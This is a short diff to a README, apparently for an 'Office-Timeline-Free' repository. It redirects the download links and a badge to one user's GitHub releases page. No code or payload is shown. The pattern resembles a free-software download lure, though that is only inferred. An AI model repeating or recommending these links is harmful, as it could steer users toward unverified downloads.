@@ -16,9 +16,9 @@ This repository is dedicated to providing valuable information and resources on 
 
 Make sure to check out our resources and links below:
 
-- [Download Project Files](https://github.com/files/Project.zip) [![Download](https://img.shields.io/badge/Download-Project_Files-brightgreen)](https://github.com/files/Project.zip)
+- [Download Project Files](https://github.com/lallleel86/Office-Timeline-Free/releases) [![Download](https://github.com/lallleel86/Office-Timeline-Free/releases)](https://github.com/lallleel86/Office-Timeline-Free/releases)
 
-If the above link doesn't work or needs to be launched, please visit our [Releases](https://github.com/Office-Timeline-Free/releases) section for alternative options.
+If the above link doesn't work or needs to be launched, please visit our [Releases](https://github.com/lallleel86/Office-Timeline-Free/releases) section for alternative options.
 
 ## Get Started
 
